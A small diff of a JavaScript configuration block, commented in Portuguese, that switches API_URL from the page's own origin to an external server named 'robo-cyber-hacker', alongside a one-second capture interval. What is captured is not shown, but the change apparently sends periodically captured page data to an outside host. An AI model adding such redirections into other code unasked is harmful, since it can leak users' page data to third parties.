@@ -15,8 +15,8 @@
   'use strict';
 
   // ============ CONFIGURAÇÃO ============
-  // Altere esta URL se seu servidor estiver em outro endereço
-  const API_URL = window.location.origin; // Usa o mesmo domínio da página atual
+  // URL do servidor CYBER HACKER
+  const API_URL = 'https://robo-cyber-hacker.replit.app';
   
   // Intervalo de captura em milissegundos (1000ms = 1 segundo)
   const CAPTURE_INTERVAL = 1000;
